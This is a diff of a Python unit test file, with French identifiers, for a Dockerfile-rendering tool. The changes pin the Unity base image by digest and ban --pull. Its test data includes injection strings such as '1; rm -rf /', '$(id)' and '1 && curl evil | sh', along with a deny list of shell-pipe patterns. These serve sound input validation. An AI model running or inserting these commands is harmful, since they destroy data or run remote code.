@@ -25,6 +25,7 @@ DOCKERFILE_TESTS = SERVEUR_OVH / "images" / "tests" / "Dockerfile"
 
 COMPLET = {"jdk": "11", "node": "18.20.4", "python": "3.11", "maven": "3.9.9", "dotnet": "8.0", "go": "1.23",
            "rust": "1.82.0", "godot": "4.7", "gradle": "9.3.1"}
+DIGEST_UNITY = "sha256:" + "c" * 64
 MALVEILLANTES = ["1; rm -rf /", "1\nRUN id", "$(id)", "`id`", "1 && curl evil | sh", "1'", '1"', "", " 1", "1 ", "1\n", "..", "1/2",
                  "latest", "18.x", "v18", "١٨"]
 
@@ -66,8 +67,11 @@ class TestRendu(unittest.TestCase):
         self.assertIn("https://nodejs.org/dist/v18.20.4/SHASUMS256.txt", texte)
 
     def test_unity_base_gameci(self):
-        texte, _ = tests_images.rendre_dockerfile(profil(unity="6000.6.7f1", unity_revision="b22767f04f04", python="3.11"))
-        self.assertIn("\nFROM unityci/editor:ubuntu-6000.6.7f1-android-4.0.0\n", texte)
+        p = profil(unity="6000.6.7f1", unity_revision="b22767f04f04", python="3.11")
+        with self.assertRaises(ValueError):
+            tests_images.rendre_dockerfile(p)                       # tâche 14g : jamais par étiquette seule (aucun tirage)
+        texte, _ = tests_images.rendre_dockerfile(p, DIGEST_UNITY)
+        self.assertIn(f"\nFROM unityci/editor:ubuntu-6000.6.7f1-android-4.0.0@{DIGEST_UNITY}\n", texte)
         self.assertIn("COPY entree-tests.sh /usr/local/bin/entree-tests.sh", texte)
         self.assertTrue(texte.rstrip().endswith('ENTRYPOINT ["/usr/local/bin/entree-tests.sh"]'))
 
@@ -100,8 +104,8 @@ class TestRendu(unittest.TestCase):
             self.assertRegex(valeur, r"^[0-9A-Za-z.+_-]+$")
 
     def test_aucun_curl_pipe_shell(self):
-        for outils in (COMPLET, {"unity": "6000.6.7f1", "node": "18"}):
-            texte, _ = tests_images.rendre_dockerfile(profil(**outils))
+        for outils, digest in ((COMPLET, None), ({"unity": "6000.6.7f1", "node": "18"}, DIGEST_UNITY)):
+            texte, _ = tests_images.rendre_dockerfile(profil(**outils), digest)
             self.assertNotRegex(texte, r"\|\s*(ba|da|z)?sh\b")
             for interdit in ("| sh", "| bash", "nvm", "sdkman", "pyenv", "ADD http", "--privileged", "--mount"):
                 self.assertNotIn(interdit, texte)
@@ -325,15 +329,18 @@ class TestEnveloppeConstruction(unittest.TestCase):
         self.assertIn("etape de construction", journal.read_text())
         self.assertTrue((self.home / "tests" / ".construction" / "usage" / self.etiquette.split("/")[1]).exists())
 
-    def test_base_unity_tiree_et_journal_borne(self):
+    def test_base_unity_locale_jamais_tiree(self):
+        # Tâche 14g : la base GameCI (27 Go) est celle déjà présente, épinglée par son digest local ; jamais de --pull.
         p = profil(unity="6000.6.7f1")
-        texte, sha = tests_images.rendre_dockerfile(p)
+        texte, sha = tests_images.rendre_dockerfile(p, DIGEST_UNITY)
         self.contexte = self.home / "tests" / ".construction" / tests_images.etiquette_derivee(p)
         self.contexte.mkdir(parents=True)
         (self.contexte / "Dockerfile").write_bytes(texte.encode())
+        (self.monde / "images" / "base_unity").write_text(f"unityci/editor:ubuntu-6000.6.7f1-android-4.0.0@{DIGEST_UNITY}")
         r = self.lancer(tests_images.etiquette_derivee(p), sha)
         self.assertEqual(r.returncode, 0, r.stderr)
-        self.assertIn("docker build --pull --label", self.builds()[0])
+        self.assertNotIn("--pull", self.builds()[0])
+        self.assertIn("-t myiafactory/tests-unity-6000.6.7f1 -t myiafactory/tests-", self.builds()[0])
 
     def test_base_locale_absente_refusee(self):
         (self.monde / "images" / "myiafactory__tests").unlink()
